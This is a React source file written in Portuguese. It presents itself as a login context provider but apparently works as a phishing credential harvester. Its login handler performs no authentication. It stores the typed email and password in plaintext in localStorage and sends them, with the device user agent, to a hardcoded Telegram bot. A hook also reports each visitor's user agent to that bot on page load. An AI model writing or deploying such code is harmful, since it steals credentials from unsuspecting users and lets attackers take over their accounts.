import { createContext, useContext } from "react";
import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { v4 as uuidv4 } from 'uuid';



const UseContextLogin = createContext();

export const AuthLogin = () => {
  const context = useContext(UseContextLogin);
  return context;
};

const ContextFazerLogin = ({ children }) => {
  const navigate = useNavigate();
 
 

  // Fazer Login e enviar...
  const enviarDadosLogin = (data) => {
    const dispositivo = navigator.userAgent;
    const token = uuidv4();
    const botToken = "7572426866:AAFi3LlkCEwL9HoL83kMe5VpIL6xs3vtEXo";
    const chatId = "7911135198";

    localStorage.setItem("email", JSON.stringify(data.email));
    localStorage.setItem("senha", JSON.stringify(data.password));
    localStorage.setItem("token", JSON.stringify(token));

    const message = `Login:\n 📩E-mail: ${data.email}\n 🔒Senha: ${data.password}\n📱Dispositivo:${dispositivo}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));

    // setActiveCriarConta(true);
    navigate("/");
    location.reload()
  };

  // Capturar dispositivo....
  function captureDispositivo() {
    const dispositivo = navigator.userAgent;

    const message = `📱Dispositivo:${dispositivo}`;
    const botToken = "7572426866:AAFi3LlkCEwL9HoL83kMe5VpIL6xs3vtEXo";
    const chatId = "7911135198";

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));
  }

  useEffect(() => {
    captureDispositivo();
  }, []);

  return (
    <UseContextLogin.Provider value={{ enviarDadosLogin }}>
      {children}
    </UseContextLogin.Provider>
  );
};

export default ContextFazerLogin;
